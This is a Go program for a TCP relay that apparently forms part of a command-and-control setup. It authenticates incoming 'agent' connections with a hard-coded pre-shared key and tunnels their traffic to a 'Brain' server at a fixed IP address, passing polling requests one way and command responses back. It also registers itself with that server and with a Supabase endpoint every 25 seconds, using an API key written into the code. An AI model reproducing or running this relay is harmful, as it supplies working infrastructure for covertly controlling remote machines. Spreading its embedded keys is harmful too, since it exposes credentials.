package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"time"
)

type AuthRequest struct {
	Type     string `json:"type"`
	Listen   string `json:"listen"`
	TargetID string `json:"target_id"`
	APIKey   string `json:"api_key"`
}

const (
	BRAIN_ADDR = "18.184.135.220:8080"
	RELAY_PORT = "5001"
	PSK        = "8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"
)

func handleHandshake(conn net.Conn) bool {
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	buf := make([]byte, len(PSK))

	_, err := io.ReadFull(conn, buf)
	if err != nil || string(buf) != PSK {
		fmt.Printf("[!] Handshake FAILED from %s (Invalid PSK)\n", conn.RemoteAddr())
		conn.Write([]byte("ERROR: UNAUTHORIZED\n"))
		conn.Close()
		return false
	}

	fmt.Printf("[+] Handshake SUCCESS from %s\n", conn.RemoteAddr())
	conn.SetReadDeadline(time.Time{})
	return true
}

func main() {
	// Start the background reporter
	go sendRelayHeartbeat()

	ln, err := net.Listen("tcp", ":"+RELAY_PORT)
	if err != nil {
		fmt.Printf("[!] Failed to start relay: %v\n", err)
		return
	}
	fmt.Printf("[+] Marengo Relay active on port %s\n", RELAY_PORT)

	for {
		c1, err := ln.Accept()
		if err != nil {
			continue
		}
		if !handleHandshake(c1) {
			continue
		}
		go bridgeToBrain(c1)
	}
}

func sendRelayHeartbeat() {
	// 1. Get Public IP for registration
	respIp, err := http.Get("https://api.ipify.org")
	publicIP := "127.0.0.1"
	if err == nil {
		ipBytes, _ := io.ReadAll(respIp.Body)
		publicIP = string(ipBytes)
		respIp.Body.Close()
	}

	fullAddr := fmt.Sprintf("%s:%s", publicIP, RELAY_PORT)
	ticker := time.NewTicker(25 * time.Second)

	fmt.Printf("[*] Heartbeat service started for %s\n", fullAddr)
	BRAIN_ADDR := "18.184.135.220:8080"

	for range ticker.C {
		// --- PART A: HEARTBEAT TO BRAIN (Required for Agent Tasking) ---
		// This tells the Brain's memory that this Relay is available for traffic.
		brainConn, err := net.DialTimeout("tcp", BRAIN_ADDR, 5*time.Second)
		if err == nil {
			// First send the PSK to pass the Brain's handshake
			brainConn.Write([]byte(PSK))

			// Send the "middle" type registration request
			// Note: The Brain looks for Type and Listen fields
			regReq := AuthRequest{
				Type:   "middle",
				Listen: fullAddr,
			}
			json.NewEncoder(brainConn).Encode(regReq)
			brainConn.Close()
			fmt.Printf("[+] Brain: Relay registered successfully at %s\n", BRAIN_ADDR)
		} else {
			fmt.Printf("[!] Brain Error: Could not check-in at %s: %v\n", BRAIN_ADDR, err)
		}

		// --- PART B: HEARTBEAT TO SUPABASE (Required for Web Dashboard) ---
		payload := map[string]interface{}{
			"addr":         fullAddr,
			"status":       "Online",
			"client_count": 0,
			"uptime":       0,
			"throughput":   "0 B/s",
		}
		jsonData, _ := json.Marshal(payload)

		url := "https://prodlnwtjkomsstrufqr.functions.supabase.co/relay-heartbeat"
		req, _ := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("x-api-key", "cff6654923ee2d56b3ce778f35542321622c6ecf20bdd4a79799364d3a3f8a0c")

		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)

		if err != nil {
			fmt.Printf("[!] SaaS Error: Network failure: %v\n", err)
			continue
		}

		if resp.StatusCode != 200 {
			body, _ := io.ReadAll(resp.Body)
			fmt.Printf("[!] SaaS Rejected (%d): %s\n", resp.StatusCode, string(body))
		} else {
			fmt.Printf("[+] SaaS: Relay status synced to Cloud Vault\n")
		}
		resp.Body.Close()
	}
}
func bridgeToBrain(c1 net.Conn) {
	defer c1.Close()

	// Connect to the Main Center (Brain)
	c2, err := net.DialTimeout("tcp", BRAIN_ADDR, 5*time.Second)
	if err != nil {
		fmt.Printf("[!] Could not connect to Brain: %v\n", err)
		return
	}
	defer c2.Close()

	// Handshake with Brain
	c2.Write([]byte(PSK))

	fmt.Printf("[*] Tunnel Established: %s <-> %s\n", c1.RemoteAddr(), BRAIN_ADDR)

	done := make(chan struct{}, 2)

	// Agent -> Relay -> Brain (Polling Request)
	go func() {
		n, _ := logTransfer(c2, c1, "AGENT -> BRAIN")
		fmt.Printf("[#] Agent side closed (%d bytes total)\n", n)
		done <- struct{}{}
	}()

	// Brain -> Relay -> Agent (Command Response)
	go func() {
		n, _ := logTransfer(c1, c2, "BRAIN -> AGENT")
		fmt.Printf("[#] Brain side closed (%d bytes total)\n", n)
		done <- struct{}{}
	}()

	<-done
}

// Custom function to log traffic in real-time
func logTransfer(dst net.Conn, src net.Conn, label string) (int64, error) {
	buf := make([]byte, 32768) // 32KB buffer
	var total int64
	for {
		nr, err := src.Read(buf)
		if nr > 0 {
			fmt.Printf("[DEBUG] %s: Forwarding %d bytes\n", label, nr)
			nw, ew := dst.Write(buf[0:nr])
			if nw > 0 {
				total += int64(nw)
			}
			if ew != nil {
				return total, ew
			}
		}
		if err != nil {
			return total, err
		}
	}
}
